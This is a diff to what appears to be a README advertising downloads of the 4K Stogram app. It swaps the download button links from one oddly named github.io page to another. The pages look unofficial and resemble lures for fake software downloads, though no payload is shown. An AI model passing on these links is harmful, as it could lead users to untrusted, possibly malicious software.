@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://jjfhjfk3858.github.io/.github/fourKStogram">
+  <a href="https://poke-pokemon.github.io/.github/fourKStogram">
     <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download 4K Stogram"/>
   </a>
 </p>
@@ -81,7 +81,7 @@ The Stories downloading capability is 4K Stogram's most time-sensitive value —
 
 <p align="center">
 
-[![Get it Now 4K Stogram](https://img.shields.io/badge/Get_it_Now-0582CA?style=for-the-badge&logo=apple&logoColor=white)](https://jjfhjfk3858.github.io/.github/fourKStogram)
+[![Get it Now 4K Stogram](https://img.shields.io/badge/Get_it_Now-0582CA?style=for-the-badge&logo=apple&logoColor=white)](https://poke-pokemon.github.io/.github/fourKStogram)
 
 </p>
 
